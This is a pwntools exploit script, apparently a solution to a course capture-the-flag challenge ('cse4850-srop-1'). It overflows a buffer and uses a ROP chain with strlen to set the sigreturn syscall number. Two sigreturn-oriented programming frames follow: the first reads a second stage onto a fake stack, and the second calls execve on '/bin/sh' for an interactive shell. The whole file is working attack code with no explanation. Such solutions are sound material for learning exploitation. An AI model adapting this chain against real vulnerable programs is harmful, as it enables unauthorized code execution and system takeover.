from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
break *0x4012bb
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote("cse4850-srop-1.chals.io", 443, ssl=True, sni="cse4850-srop-1.chals.io")
    else:
        return process(e.path)


p = start()

syscall_ret = r.find_gadget(['syscall'])[0]
pop_rdi = r.find_gadget(['pop rdi','ret'])[0]
fake_stack = 0x404e10


#FIRST CHAIN AND FRAME

frame = SigreturnFrame()
frame.rax = 0x0                     # sys_read 
frame.rdi = 0x0                     
frame.rsi = fake_stack              # 0x404e10
frame.rdx = 0x1000                  # size to read in
frame.rip = syscall_ret
frame.rsp = fake_stack+0x8          # 0x404e10+0x8


chain = cyclic(16)
chain += p64(pop_rdi)
chain += p64(next(e.search(b'e best of you?\n')))
chain += p64(e.plt['strlen'])
chain += p64(syscall_ret)
chain += bytes(frame)

p.sendlineafter(b'-------------------------------------',chain)

#SECOND CHAIN AND FRAME

frame = SigreturnFrame()
frame.rax = 0x3b                
frame.rdi = fake_stack          
frame.rsi = 0x0                 
frame.rdx = 0x0                 
frame.rip = syscall_ret

chain = b'/bin/sh\0'            # /bin/sh at top of stack
chain += p64(0)
chain += p64(pop_rdi)
chain += p64(next(e.search(b'e best of you?\n')))
chain += p64(e.plt['strlen'])
chain += p64(syscall_ret)               
chain += bytes(frame)        

pause()
p.sendline(chain)
p.interactive()


